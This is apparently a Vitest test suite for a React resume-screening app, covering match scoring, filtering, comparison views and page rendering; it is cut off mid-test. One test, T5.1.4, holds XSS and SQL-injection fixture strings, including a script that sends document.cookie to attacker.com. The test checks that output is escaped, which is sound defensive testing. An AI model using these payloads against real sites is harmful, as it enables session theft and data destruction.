import React from 'react';
import { describe, it, expect } from 'vitest';
import { renderToString } from 'react-dom/server';
import { MemoryRouter, Routes, Route } from 'react-router-dom';

// Types
import type {
  Candidate,
  Job,
  Resume,
  DashboardStats,
  DetailedScoreBreakdown,
  JobCreatePayload,
} from '../src/types';

// Utils
import {
  normalizeSkill,
  parseSkillList,
  extractCandidateSkillNames,
  calculateDetailedMatch,
  filterAndSortCandidates,
  buildCandidateComparison,
  getScoreTier,
} from '../src/utils/matching';
import {
  LinkedinIcon,
  GithubIcon,
  TwitterIcon,
  PortfolioIcon,
  SparklesIcon,
  BrainCircuitIcon,
  PulseDot,
} from '../src/utils/icons';

// Services
import {
  CandidateService,
  JobService,
  ResumeService,
  DashboardService,
  HealthService,
} from '../src/services/api';

// UI Primitives
import { Button } from '../src/components/ui/Button';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '../src/components/ui/Card';
import { Badge } from '../src/components/ui/Badge';
import { Modal } from '../src/components/ui/Modal';
import { Input, Textarea } from '../src/components/ui/Input';
import { Tabs } from '../src/components/ui/Tabs';
import { Skeleton, SkeletonText, SkeletonCard, SkeletonStatCard } from '../src/components/ui/Skeleton';

// Layout
import Sidebar from '../src/components/layout/Sidebar';
import Topbar from '../src/components/layout/Topbar';
import { MobileNav } from '../src/components/layout/MobileNav';
import { LayoutShell } from '../src/components/layout/LayoutShell';
import { AmbientGlow } from '../src/components/layout/AmbientGlow';

// High-Impact Modals & Drawers
import { CandidateComparisonModal } from '../src/components/candidates/CandidateComparisonModal';
import { ResumePreviewDrawer } from '../src/components/candidates/ResumePreviewDrawer';

// Pages
import Dashboard from '../src/pages/Dashboard';
import Upload from '../src/pages/Upload';
import Candidates from '../src/pages/Candidates';
import CandidateProfile from '../src/pages/CandidateProfile';
import Jobs from '../src/pages/Jobs';
import JobCandidates from '../src/pages/JobCandidates';

// Fixtures from setup
import {
  mockCandidateAlice,
  mockCandidateBob,
  mockCandidateCarol,
  mockCandidateDave,
  mockJobFrontendLead,
  mockJobAIResearcher,
  mockJobGeneralDev,
  mockDashboardStats,
} from './setup';

describe('Tier 5 Adversarial Coverage Hardening Suite', () => {

  // =========================================================================
  // 1. Extreme Edge Cases & Malformed Candidate / Job Data
  // =========================================================================
  describe('1. Extreme Edge Cases & Malformed Data Handling', () => {
    
    it('T5.1.1: handles candidates with completely null/undefined/empty fields without throwing', () => {
      const zombieCandidate: Candidate = {
        id: 999,
        full_name: '',
        email: '',
        phone: null as any,
        location: null as any,
        linkedin_url: null,
        github_url: null,
        portfolio_url: null,
        summary: null as any,
        total_experience_months: null as any,
        skills: null as any,
        experiences: null as any,
        educations: null as any,
      };

      const emptyJob: Job = {
        id: 999,
        title: '',
        company: '',
        description: '',
        required_skills: null as any,
        preferred_skills: null as any,
        minimum_experience_years: null as any,
        education_requirement: null as any,
        location: null as any,
      };

      expect(() => extractCandidateSkillNames(zombieCandidate)).not.toThrow();
      expect(extractCandidateSkillNames(zombieCandidate)).toEqual([]);

      const match = calculateDetailedMatch(zombieCandidate, emptyJob);
      expect(match).toBeDefined();
      expect(match.overall_score).toBeGreaterThanOrEqual(0);
      expect(match.overall_score).toBeLessThanOrEqual(100);
      expect(Number.isNaN(match.overall_score)).toBe(false);
      expect(match.matching_skills).toEqual([]);
      expect(match.missing_skills).toEqual([]);
    });

    it('T5.1.2: handles candidate with extreme negative and massive numbers for experience', () => {
      const negativeExpCandidate: Candidate = {
        ...mockCandidateAlice,
        id: 101,
        total_experience_months: -240, // -20 years
      };

      const massiveExpCandidate: Candidate = {
        ...mockCandidateAlice,
        id: 102,
        total_experience_months: 12000, // 1000 years
      };

      const matchNeg = calculateDetailedMatch(negativeExpCandidate, mockJobFrontendLead);
      expect(matchNeg.overall_score).toBeGreaterThanOrEqual(0);
      expect(matchNeg.overall_score).toBeLessThanOrEqual(100);
      expect(Number.isNaN(matchNeg.overall_score)).toBe(false);

      const matchMassive = calculateDetailedMatch(massiveExpCandidate, mockJobFrontendLead);
      expect(matchMassive.experience_score).toBe(100);
      expect(matchMassive.overall_score).toBeGreaterThanOrEqual(0);
      expect(matchMassive.overall_score).toBeLessThanOrEqual(100);
      expect(Number.isNaN(matchMassive.overall_score)).toBe(false);
    });

    it('T5.1.3: handles massive skill array (500+ skills) without memory exhaustion or degradation', () => {
      const hugeSkillsList = Array.from({ length: 500 }, (_, i) => ({
        id: i + 1,
        candidate_id: 888,
        skill_id: i + 1,
        proficiency: 'Advanced' as const,
        skill: { id: i + 1, name: `Skill_${i}`, category: 'Tech' },
      }));

      hugeSkillsList.push({
        id: 501,
        candidate_id: 888,
        skill_id: 501,
        proficiency: 'Expert' as const,
        skill: { id: 501, name: 'React', category: 'Frontend' },
      });
      hugeSkillsList.push({
        id: 502,
        candidate_id: 888,
        skill_id: 502,
        proficiency: 'Expert' as const,
        skill: { id: 502, name: 'TypeScript', category: 'Languages' },
      });

      const superCandidate: Candidate = {
        ...mockCandidateAlice,
        id: 888,
        skills: hugeSkillsList,
      };

      const start = performance.now();
      const extracted = extractCandidateSkillNames(superCandidate);
      const match = calculateDetailedMatch(superCandidate, mockJobFrontendLead);
      const duration = performance.now() - start;

      expect(extracted.length).toBe(502);
      expect(match.matching_skills).toContain('React');
      expect(match.matching_skills).toContain('TypeScript');
      expect(duration).toBeLessThan(100);
    });

    it('T5.1.4: safely parses adversarial XSS and SQL injection payloads in Candidate & Job profiles', () => {
      const xssCandidate: Candidate = {
        id: 666,
        full_name: '<script>alert("XSS")</script> Robert\'); DROP TABLE candidates;--',
        email: '"><img src=x onerror=alert(1)>@domain.com',
        phone: '+1 (555) 000-0000; SELECT * FROM users',
        location: '<svg onload=alert(document.cookie)>San Francisco',
        linkedin_url: 'javascript:alert("pwned")',
        github_url: 'data:text/html,<script>alert("xss")</script>',
        portfolio_url: 'https://evil.com/xss?q=<script>',
        summary: '"><iframe src="javascript:alert(1)"></iframe> Normal summary text with SQL \' OR 1=1 --',
        total_experience_months: 60,
        skills: [
          {
            id: 1,
            candidate_id: 666,
            skill_id: 1,
            proficiency: 'Expert',
            skill: { id: 1, name: '<script>alert("react")</script>', category: 'Frontend' },
          },
        ],
        experiences: [
          {
            id: 1,
            candidate_id: 666,
            job_title: '<img src=x onerror=alert("title")>',
            company: 'Tech Corp <script>',
            start_date: '2020',
            end_date: '2024',
            description: '<script>fetch("http://attacker.com?leak=" + document.cookie)</script>',
          },
        ],
        educations: [],
      };

      const xssJob: Job = {
        id: 777,
        title: '<script>alert("job")</script>',
        company: 'Vulnerable Corp \' OR \'1\'=\'1',
        description: '<img src=x onerror=alert("desc")>',
        required_skills: '<script>alert("react")</script>, TypeScript',
        preferred_skills: 'Python, <b onmouseover=alert(1)>Docker</b>',
        minimum_experience_years: 3,
        education_requirement: '<script>alert("edu")</script>',
        location: 'Remote',
      };

      const match = calculateDetailedMatch(xssCandidate, xssJob);
      expect(match).toBeDefined();
      expect(Number.isNaN(match.overall_score)).toBe(false);

      const html = renderToString(
        <MemoryRouter>
          <ResumePreviewDrawer
            isOpen={true}
            onClose={() => {}}
            candidate={xssCandidate}
            job={xssJob}
          />
        </MemoryRouter>
      );

      // React escapes raw HTML entities into &lt;script&gt;
      expect(html).not.toContain('<script>alert("XSS")</script>');
      expect(html).toContain('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    });

    it('T5.1.5: handles unicode, RTL, zero-width characters, emojis, and multi-byte surrogate pairs', () => {
      const unicodeCandidate: Candidate = {
        ...mockCandidateAlice,
        id: 555,
        full_name: '👩‍💻 Dr. 艾利斯 • Müller • اليس \u200B\uFEFF',
        summary: 'Specialist in 🚀 AI systems. \u202E reversed text \u202C with 🐍 Python and ⚡ React.',
        location: 'Zürich, München, 北京, القاهرة',
      };

      const searchResult = filterAndSortCandidates(
        [unicodeCandidate],
        {
          searchQuery: '艾利斯',
          selectedSkills: [],
          skillMatchMode: 'any',
          minExperienceYears: 0,
          location: 'All',
          sortBy: 'created_at_desc',
        }
      );

      expect(searchResult.length).toBe(1);
      expect(searchResult[0].id).toBe(555);

      const emojiSearchResult = filterAndSortCandidates(
        [unicodeCandidate],
        {
          searchQuery: 'Müller',
          selectedSkills: [],
          skillMatchMode: 'any',
          minExperienceYears: 0,
          location: 'All',
          sortBy: 'created_at_desc',
        }
      );

      expect(emojiSearchResult.length).toBe(1);
    });

    it('T5.1.6: handles regex special characters in skills and job descriptions without breaking RegExp matching', () => {
      const regexCandidate: Candidate = {
        ...mockCandidateAlice,
        id: 444,
        skills: [
          { id: 1, candidate_id: 444, skill_id: 1, proficiency: 'Expert', skill: { id: 1, name: 'C++', category: 'Backend' } },
          { id: 2, candidate_id: 444, skill_id: 2, proficiency: 'Expert', skill: { id: 2, name: 'C#', category: 'Backend' } },
          { id: 3, candidate_id: 444, skill_id: 3, proficiency: 'Expert', skill: { id: 3, name: '.NET (Core)', category: 'Backend' } },
          { id: 4, candidate_id: 444, skill_id: 4, proficiency: 'Expert', skill: { id: 4, name: 'Node.js [v18+]', category: 'Backend' } },
        ],
      };

      const regexJob: Job = {
        ...mockJobFrontendLead,
        id: 333,
        required_skills: 'C++, C#, .NET (Core)',
        preferred_skills: 'Node.js [v18+], (regex|test)',
      };

      expect(() => calculateDetailedMatch(regexCandidate, regexJob)).not.toThrow();
      const match = calculateDetailedMatch(regexCandidate, regexJob);
      expect(match.overall_score).toBeGreaterThan(0);
      expect(Number.isNaN(match.overall_score)).toBe(false);
    });
  });

  // =========================================================================
  // 2. Score Calculation Boundaries & Clamping Hardening
  // =========================================================================
  describe('2. Score Calculation Boundaries & Math Invariants', () => {
    
    it('T5.2.1: strictly clamps all score dimensions between 0.0 and 100.0 under all inputs', () => {
      const candidates = [
        mockCandidateAlice,
        mockCandidateBob,
        mockCandidateCarol,
        mockCandidateDave,
        {
          ...mockCandidateAlice,
          total_experience_months: 0,
          skills: [],
          experiences: [],
          educations: [],
          summary: '',
        },
      ];

      const jobs = [
        mockJobFrontendLead,
        mockJobAIResearcher,
        mockJobGeneralDev,
        {
          id: 999,
          title: 'Impossible Job',
          company: 'HyperCorp',
          description: 'Requires impossible skills',
          required_skills: 'QuantumComputingX, InterstellarFlightY',
          preferred_skills: 'WarpDriveZ',
          minimum_experience_years: 50,
          education_requirement: 'Ph.D. in Theoretical Astrophysics',
          location: 'Mars',
        },
      ];

      candidates.forEach((cand) => {
        jobs.forEach((job) => {
          const breakdown = calculateDetailedMatch(cand, job);
          expect(breakdown.overall_score).toBeGreaterThanOrEqual(0);
          expect(breakdown.overall_score).toBeLessThanOrEqual(100);
          expect(breakdown.skill_score).toBeGreaterThanOrEqual(0);
          expect(breakdown.skill_score).toBeLessThanOrEqual(100);
          expect(breakdown.experience_score).toBeGreaterThanOrEqual(0);
          expect(breakdown.experience_score).toBeLessThanOrEqual(100);
          expect(breakdown.education_score).toBeGreaterThanOrEqual(0);
          expect(breakdown.education_score).toBeLessThanOrEqual(100);
          expect(breakdown.keyword_score).toBeGreaterThanOrEqual(0);
          expect(breakdown.keyword_score).toBeLessThanOrEqual(100);
          expect(Number.isNaN(breakdown.overall_score)).toBe(false);
        });
      });
    });

    it('T5.2.2: verifies exact threshold boundary transitions for getScoreTier', () => {
      expect(getScoreTier(100).tier).toBe('Excellent Match');
      expect(getScoreTier(85.0).tier).toBe('Excellent Match');
      expect(getScoreTier(84.99).tier).toBe('Good Match');
      expect(getScoreTier(70.0).tier).toBe('Good Match');
      expect(getScoreTier(69.99).tier).toBe('Moderate Match');
      expect(getScoreTier(50.0).tier).toBe('Moderate Match');
      expect(getScoreTier(49.99).tier).toBe('Low Match');
      expect(getScoreTier(0).tier).toBe('Low Match');
      expect(getScoreTier(-10).tier).toBe('Low Match');
    });

    it('T5.2.3: handles job with empty required_skills and empty preferred_skills without division by zero', () => {
      const noSkillJob: Job = {
        ...mockJobFrontendLead,
        required_skills: '',
        preferred_skills: '',
      };

      const breakdown = calculateDetailedMatch(mockCandidateAlice, noSkillJob);
      expect(breakdown.skill_score).toBe(100);
      expect(breakdown.keyword_score).toBe(100);
      expect(Number.isNaN(breakdown.overall_score)).toBe(false);
    });

    it('T5.2.4: verifies recommendation synthesis matches score brackets accurately', () => {
      const strongBreakdown = calculateDetailedMatch(mockCandidateAlice, mockJobFrontendLead);
      expect(['Strong Match', 'Good Match']).toContain(strongBreakdown.recommendation);

      const weakCandidate: Candidate = {
        ...mockCandidateDave,
        skills: [],
        experiences: [],
        educations: [],
        summary: 'No relevant skills at all',
      };
      const weakBreakdown = calculateDetailedMatch(weakCandidate, mockJobAIResearcher);
      expect(weakBreakdown.recommendation).toBe('Weak Match');
    });
  });

  // =========================================================================
  // 3. Multi-Candidate Comparison Matrix (Feature A) Adversarial Stress
  // =========================================================================
  describe('3. Candidate Comparison Matrix (Feature A) Adversarial Stress', () => {
    
    it('T5.3.1: buildCandidateComparison handles 0 candidates gracefully', () => {
      const emptyComparison = buildCandidateComparison([], mockJobFrontendLead);
      expect(emptyComparison.candidates).toEqual([]);
      expect(emptyComparison.commonSkillsAcrossAll).toEqual([]);
      expect(emptyComparison.allComparedSkills).toEqual([]);
    });

    it('T5.3.2: buildCandidateComparison handles 1 candidate edge case', () => {
      const singleComparison = buildCandidateComparison([mockCandidateAlice], mockJobFrontendLead);
      expect(singleComparison.candidates.length).toBe(1);
      expect(singleComparison.commonSkillsAcrossAll.length).toBeGreaterThan(0);
      expect(singleComparison.candidates[0].uniqueSkills.length).toBe(mockCandidateAlice.skills.length);
    });

    it('T5.3.3: buildCandidateComparison handles 4 clone candidates with 100% skill overlap', () => {
      const clones = [
        { ...mockCandidateAlice, id: 1 },
        { ...mockCandidateAlice, id: 2 },
        { ...mockCandidateAlice, id: 3 },
        { ...mockCandidateAlice, id: 4 },
      ];

      const comparison = buildCandidateComparison(clones, mockJobFrontendLead);
      expect(comparison.candidates.length).toBe(4);
      expect(comparison.commonSkillsAcrossAll.length).toBeGreaterThan(0);
      comparison.candidates.forEach((candItem) => {
        expect(candItem.uniqueSkills).toEqual([]);
      });
    });

    it('T5.3.4: buildCandidateComparison handles completely disjoint skill sets across candidates', () => {
      const disjointAlice: Candidate = {
        ...mockCandidateAlice,
        skills: [
          { id: 1, candidate_id: 1, skill_id: 1, proficiency: 'Expert', skill: { id: 1, name: 'React', category: 'Frontend' } },
        ],
      };
      const disjointCarol: Candidate = {
        ...mockCandidateCarol,
        skills: [
          { id: 2, candidate_id: 3, skill_id: 13, proficiency: 'Expert', skill: { id: 13, name: 'PyTorch', category: 'AI' } },
        ],
      };

      const comparison = buildCandidateComparison([disjointAlice, disjointCarol]);
      expect(comparison.commonSkillsAcrossAll).toEqual([]);
      expect(comparison.candidates[0].uniqueSkills).toContain('React');
      expect(comparison.candidates[1].uniqueSkills).toContain('PyTorch');
    });

    it('T5.3.5: renders CandidateComparisonModal when closed and open without DOM crashes', () => {
      const closedHtml = renderToString(
        <MemoryRouter>
          <CandidateComparisonModal
            isOpen={false}
            onClose={() => {}}
            candidates={[mockCandidateAlice, mockCandidateBob]}
          />
        </MemoryRouter>
      );
      expect(closedHtml).toBe('');

      const openHtml = renderToString(
        <MemoryRouter>
          <CandidateComparisonModal
            isOpen={true}
            onClose={() => {}}
            candidates={[mockCandidateAlice, mockCandidateBob, mockCandidateCarol, mockCandidateDave]}
            jobs={[]}
            initialJobId={null}
          />
        </MemoryRouter>
      );
      expect(openHtml).toContain('Comparison Matrix');
      expect(openHtml).toContain('Alice Johnson');
      expect(openHtml).toContain('Bob Martinez');
      expect(openHtml).toContain('Dr. Carol Vance');
      expect(openHtml).toContain('Dave Wilson');
    });

    it('T5.3.6: calculates 5-axis Radar metrics with 100% fullMark and bounds compliance', () => {
      const comparison = buildCandidateComparison([mockCandidateAlice, mockCandidateDave], mockJobFrontendLead);
      
      comparison.candidates.forEach((c) => {
        expect(c.radarMetrics.length).toBe(5);
        c.radarMetrics.forEach((metric) => {
          expect(metric.fullMark).toBe(100);
          expect(metric.score).toBeGreaterThanOrEqual(0);
          expect(metric.score).toBeLessThanOrEqual(100);
          expect(Number.isNaN(metric.score)).toBe(false);
          expect(['Technical Skills', 'Experience Depth', 'Keywords / NLP', 'Education Fit', 'Profile Completeness']).toContain(metric.subject);
        });
      });
    });
  });

  // =========================================================================
  // 4. Resume Live Preview Drawer (Feature B) Adversarial Stress
  // =========================================================================
  describe('4. Resume Live Preview Drawer (Feature B) Adversarial Stress', () => {
    const sampleResume: Resume = {
      id: 10,
      candidate_id: 1,
      file_path: 'uploads/resumes/alice.pdf',
      parsed_text: `Alice Johnson - Full Stack Engineer
React, TypeScript, Node.js, Python, AWS, PostgreSQL, Tailwind CSS.
Built scalable microservices and design systems.
Stanford University Computer Science.`,
    };

    it('T5.4.1: renders ResumePreviewDrawer with candidate and null resume (fallback mode)', () => {
      const html = renderToString(
        <MemoryRouter>
          <ResumePreviewDrawer
            isOpen={true}
            onClose={() => {}}
            candidate={mockCandidateAlice}
            resume={null}
            job={mockJobFrontendLead}
          />
        </MemoryRouter>
      );

      expect(html).toContain('Alice Johnson');
      expect(html).toContain('San Francisco, CA');
      expect(html).toContain('Fit Score');
      expect(html).toContain('Professional Summary');
      expect(html).toContain('Categorized Skills');
      expect(html).toContain('Experience History');
    });

    it('T5.4.2: renders ResumePreviewDrawer with initial tab set to raw_text', () => {
      const html = renderToString(
        <MemoryRouter>
          <ResumePreviewDrawer
            isOpen={true}
            onClose={() => {}}
            candidate={mockCandidateAlice}
            resume={sampleResume}
            job={mockJobFrontendLead}
            initialTab="raw_text"
          />
        </MemoryRouter>
      );

      expect(html).toContain('Raw Text');
      expect(html).toContain('Search within extracted resume...');
      expect(html).toContain('Copy Text');
      expect(html).toContain('uploads/resumes/alice.pdf');
      expect(html).toContain('Alice Johnson - Full Stack Engineer');
    });

    it('T5.4.3: renders ResumePreviewDrawer with initial tab set to keywords and active search term', () => {
      const html = renderToString(
        <MemoryRouter>
          <ResumePreviewDrawer
            isOpen={true}
            onClose={() => {}}
            candidate={mockCandidateAlice}
            resume={sampleResume}
            job={mockJobFrontendLead}
            initialTab="keywords"
            initialSearchTerm="React"
          />
        </MemoryRouter>
      );

      expect(html).toContain('Keywords');
      expect(html).toContain('React');
      expect(html).toContain('TypeScript');
    });

    it('T5.4.4: renders ResumePreviewDrawer with initial tab set to insights', () => {
      const html = renderToString(
        <MemoryRouter>
          <ResumePreviewDrawer
            isOpen={true}
            onClose={() => {}}
            candidate={mockCandidateAlice}
            resume={sampleResume}
            job={mockJobFrontendLead}
            initialTab="insights"
          />
        </MemoryRouter>
      );

      expect(html).toContain('AI Fit Recommendation');
      expect(html).toContain('Suggested Interview Questions');
    });

    it('T5.4.5: handles search term containing dangerous regex operators in ResumePreviewDrawer', () => {
      const dangerousSearchTerms = ['(', ')', '[', ']', '*', '+', '?', '\\', '^', '$', '|', '.', '{', '}'];
      
      dangerousSearchTerms.forEach((term) => {
        expect(() => {
          renderToString(
            <MemoryRouter>
              <ResumePreviewDrawer
                isOpen={true}
                onClose={() => {}}
                candidate={mockCandidateAlice}
                resume={sampleResume}
                job={mockJobFrontendLead}
                initialSearchTerm={term}
              />
            </MemoryRouter>
          );
        }).not.toThrow();
      });
    });

    it('T5.4.6: handles massive raw text payload (100,000+ characters) in preview drawer without crash', () => {
      const hugeText = 'Paragraph of resume text with React and TypeScript. '.repeat(2000);
      const massiveResume: Resume = {
        id: 99,
        candidate_id: 1,
        file_path: 'resumes/huge.pdf',
        parsed_text: hugeText,
      };

      const start = performance.now();
      const html = renderToString(
        <MemoryRouter>
          <ResumePreviewDrawer
            isOpen={true}
            onClose={() => {}}
            candidate={mockCandidateAlice}
            resume={massiveResume}
            initialTab="raw_text"
          />
        </MemoryRouter>
      );
      const duration = performance.now() - start;

      expect(html).toContain('Raw Text');
      expect(html).toContain('Copy Text');
      expect(duration).toBeLessThan(500);
    });
  });

  // =========================================================================
  // 5. Multi-Facet Filtering & Sorting Engine Stress
  // =========================================================================
  describe('5. Multi-Facet Filtering & Sorting Engine Stress', () => {
    const dataset: Candidate[] = [
      mockCandidateAlice, // 5.0 yrs, SF, React/TS/Py/AWS/Tailwind
      mockCandidateBob,   // 3.0 yrs, NY, React/JS/Vue/Tailwind
      mockCandidateCarol, // 6.0 yrs, Seattle, Py/ML/DL/PyTorch/FastAPI
      mockCandidateDave,  // 0.5 yrs, Austin, JS/HTML/CSS
    ];

    it('T5.5.1: filters candidates by location with case insensitivity and partial matching', () => {
      const sfCandidates = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: [],
        skillMatchMode: 'any',
        minExperienceYears: 0,
        location: 'san francisco',
        sortBy: 'created_at_desc',
      });
      expect(sfCandidates.length).toBe(1);
      expect(sfCandidates[0].id).toBe(mockCandidateAlice.id);

      const nyCandidates = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: [],
        skillMatchMode: 'any',
        minExperienceYears: 0,
        location: 'NEW YORK',
        sortBy: 'created_at_desc',
      });
      expect(nyCandidates.length).toBe(1);
      expect(nyCandidates[0].id).toBe(mockCandidateBob.id);
    });

    it('T5.5.2: filters candidates with AND mode requiring all selected skills', () => {
      const reactAndTs = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: ['React', 'TypeScript'],
        skillMatchMode: 'all',
        minExperienceYears: 0,
        location: 'All',
        sortBy: 'created_at_desc',
      });
      expect(reactAndTs.length).toBe(1);
      expect(reactAndTs[0].id).toBe(mockCandidateAlice.id);

      const reactOrTs = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: ['React', 'TypeScript'],
        skillMatchMode: 'any',
        minExperienceYears: 0,
        location: 'All',
        sortBy: 'created_at_desc',
      });
      expect(reactOrTs.length).toBe(2);
    });

    it('T5.5.3: sorts candidates by match score descending when job context is provided', () => {
      const sorted = filterAndSortCandidates(
        dataset,
        {
          searchQuery: '',
          selectedSkills: [],
          skillMatchMode: 'any',
          minExperienceYears: 0,
          location: 'All',
          sortBy: 'match_score_desc',
        },
        mockJobFrontendLead
      );

      expect(sorted[0].id).toBe(mockCandidateAlice.id);
      const aliceScore = calculateDetailedMatch(sorted[0], mockJobFrontendLead).overall_score;
      const secondScore = calculateDetailedMatch(sorted[1], mockJobFrontendLead).overall_score;
      expect(aliceScore).toBeGreaterThanOrEqual(secondScore);
    });

    it('T5.5.4: sorts candidates by experience ascending and descending correctly', () => {
      const descExp = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: [],
        skillMatchMode: 'any',
        minExperienceYears: 0,
        location: 'All',
        sortBy: 'experience_desc',
      });
      expect(descExp[0].id).toBe(mockCandidateCarol.id);
      expect(descExp[descExp.length - 1].id).toBe(mockCandidateDave.id);

      const ascExp = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: [],
        skillMatchMode: 'any',
        minExperienceYears: 0,
        location: 'All',
        sortBy: 'experience_asc',
      });
      expect(ascExp[0].id).toBe(mockCandidateDave.id);
      expect(ascExp[ascExp.length - 1].id).toBe(mockCandidateCarol.id);
    });

    it('T5.5.5: sorts candidates alphabetically by name', () => {
      const sortedNames = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: [],
        skillMatchMode: 'any',
        minExperienceYears: 0,
        location: 'All',
        sortBy: 'name_asc',
      });
      expect(sortedNames[0].full_name).toBe('Alice Johnson');
      expect(sortedNames[1].full_name).toBe('Bob Martinez');
      expect(sortedNames[2].full_name).toBe('Dave Wilson');
      expect(sortedNames[3].full_name).toBe('Dr. Carol Vance');
    });

    it('T5.5.6: filters candidates with high experience cutoff', () => {
      const seniorOnly = filterAndSortCandidates(dataset, {
        searchQuery: '',
        selectedSkills: [],
        skillMatchMode: 'any',
        minExperienceYears: 5.5,
        location: 'All',
        sortBy: 'created_at_desc',
      });
      expect(seniorOnly.length).toBe(1);
      expect(seniorOnly[0].id).toBe(mockCandidateCarol.id);
    });
  });

  // =========================================================================
  // 6. UI Primitives & Glassmorphic Components Hardening
  // =========================================================================
  describe('6. UI Primitives & Glassmorphic Tokens Hardening', () => {

    it('T5.6.1: renders Button with left/right icons, loading spinners, and disabled state', () => {
      const htmlNormal = renderToString(
        <Button
          variant="primary"
          size="lg"
          leftIcon={<SparklesIcon className="w-4 h-4" />}
          rightIcon={<PulseDot />}
        >
          Generate Matrix
        </Button>
      );
      expect(htmlNormal).toContain('Generate Matrix');
      expect(htmlNormal).toContain('bg-gradient-to-r from-indigo-500');

      const htmlLoading = renderToString(
        <Button
          variant="emerald"
          size="md"
          isLoading={true}
        >
          Analyzing Candidate
        </Button>
      );
      expect(htmlLoading).toContain('disabled=""');
      expect(htmlLoading).toContain('animate-spin');
    });

    it('T5.6.2: renders Badge with all 7 color variants and remove trigger buttons', () => {
      const variants = ['indigo', 'emerald', 'amber', 'rose', 'cyan', 'purple', 'slate'] as const;
      variants.forEach((v) => {
        const html = renderToString(
          <Badge variant={v} size="sm" dot pulse onRemove={() => {}} children={`Tag-${v}`} />
        );
        expect(html).toContain(`Tag-${v}`);
        expect(html).toContain('aria-label="Remove"');
      });
    });

    it('T5.6.3: renders Input & Textarea with error feedback, helper text, and icon adornments', () => {
      const inputHtml = renderToString(
        <Input
          label="Target Role Title"
          error="Title is required"
          helperText="e.g. Senior Staff Engineer"
          leftIcon={<BrainCircuitIcon className="w-4 h-4" />}
          defaultValue="Lead Architect"
        />
      );
      expect(inputHtml).toContain('Target Role Title');
      expect(inputHtml).toContain('Title is required');
      expect(inputHtml).toContain('border-rose-500');

      const textareaHtml = renderToString(
        <Textarea
          label="Job Description"
          rows={5}
          placeholder="Paste raw JD here..."
          defaultValue="We are hiring..."
        />
      );
      expect(textareaHtml).toContain('Job Description');
      expect(textareaHtml).toContain('We are hiring...');
    });

    it('T5.6.4: renders Tabs with active pill indicators and badge counts', () => {
      const tabs = [
        { id: 'all', label: 'All Candidates', count: 42 },
        { id: 'screened', label: 'Screened', count: 18 },
        { id: 'shortlisted', label: 'Shortlisted', count: 5 },
      ];

      const html = renderToString(
        <Tabs
          tabs={tabs}
          activeTab="screened"
          onChange={() => {}}
          size="md"
        />
      );

      expect(html).toContain('All Candidates');
      expect(html).toContain('Screened');
      expect(html).toContain('Shortlisted');
      expect(html).toContain('42');
      expect(html).toContain('18');
      expect(html).toContain('5');
    });

    it('T5.6.5: renders Skeleton and SkeletonCard placeholders for shimmer loading states', () => {
      const cardHtml = renderToString(<SkeletonCard />);
      expect(cardHtml).toContain('animate-shimmer');

      const statHtml = renderToString(<SkeletonStatCard />);
      expect(statHtml).toContain('animate-shimmer');
    });

    it('T5.6.6: renders Modal with header, body, footer, and close button triggers', () => {
      const html = renderToString(
        <Modal
          isOpen={true}
          onClose={() => {}}
          title="Confirm Deletion"
          subtitle="This action cannot be undone"
          size="md"
          footer={
            <div className="flex gap-2">
              <Button variant="ghost">Cancel</Button>
              <Button variant="danger">Delete</Button>
            </div>
          }
        >
          <p>Are you sure you want to remove this candidate profile?</p>
        </Modal>
      );

      expect(html).toContain('Confirm Deletion');
      expect(html).toContain('This action cannot be undone');
      expect(html).toContain('Are you sure you want to remove this candidate profile?');
      expect(html).toContain('Delete');
      expect(html).toContain('Cancel');
    });
  });

  // =========================================================================
  // 7. Full Page Render Verification & Route Navigation
  // =========================================================================
  describe('7. Redesigned Pages Empirical Render & Route Verification', () => {

    it('T5.7.1: renders Dashboard page with KPI cards, quick CTAs, and layout elements', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/']}>
          <Dashboard />
        </MemoryRouter>
      );

      expect(html).toContain('Executive Dashboard');
      expect(html).toContain('AI Engine: Online • 99.8%');
      expect(html).toContain('Real-time candidate telemetry');
      expect(html).toContain('Upload Resume');
      expect(html).toContain('Create Job');
      expect(html).toContain('Top Skills in Talent Pool');
      expect(html).toContain('Candidate Match Tier Funnel');
      expect(html).toContain('Recent Candidates');
      expect(html).toContain('Open Requisitions');
    });

    it('T5.7.2: renders Upload page with 4-stage pipeline stepper and drag-and-drop dropzone', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/upload']}>
          <Upload />
        </MemoryRouter>
      );

      expect(html).toContain('Neural Resume Ingestion Engine');
      expect(html).toContain('Upload &amp; Screen Resumes');
      expect(html).toContain('Drag and drop candidate resume here');
      expect(html).toContain('Browse Files');
      expect(html).toContain('OCR Layout Parsing');
      expect(html).toContain('NLP Entity Detection');
      expect(html).toContain('Instant Vector Scoring');
    });

    it('T5.7.3: renders Candidates directory page with search input, category filters, and action CTAs', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/candidates']}>
          <Candidates />
        </MemoryRouter>
      );

      expect(html).toContain('Talent Intelligence');
      expect(html).toContain('Directory &amp; Screening');
      expect(html).toContain('Candidate');
      expect(html).toContain('Directory');
      expect(html).toContain('Search by candidate name, email, skills, summary, or location...');
      expect(html).toContain('Web Frontend');
      expect(html).toContain('Backend &amp; Systems');
      expect(html).toContain('Data &amp; AI');
      expect(html).toContain('DevOps &amp; Cloud');
      expect(html).toContain('Upload Resume');
    });

    it('T5.7.4: renders CandidateProfile page with hero section, tabs, and action bar', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/candidates/1']}>
          <Routes>
            <Route path="/candidates/:id" element={<CandidateProfile />} />
          </Routes>
        </MemoryRouter>
      );

      expect(html).toBeDefined();
      expect(html.length).toBeGreaterThan(100);
    });

    it('T5.7.5: renders Jobs page with requisition cards, metrics, and Create Job action', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/jobs']}>
          <Jobs />
        </MemoryRouter>
      );

      expect(html).toContain('Talent Acquisition');
      expect(html).toContain('Requisition Hub');
      expect(html).toContain('Open Job');
      expect(html).toContain('Requisitions');
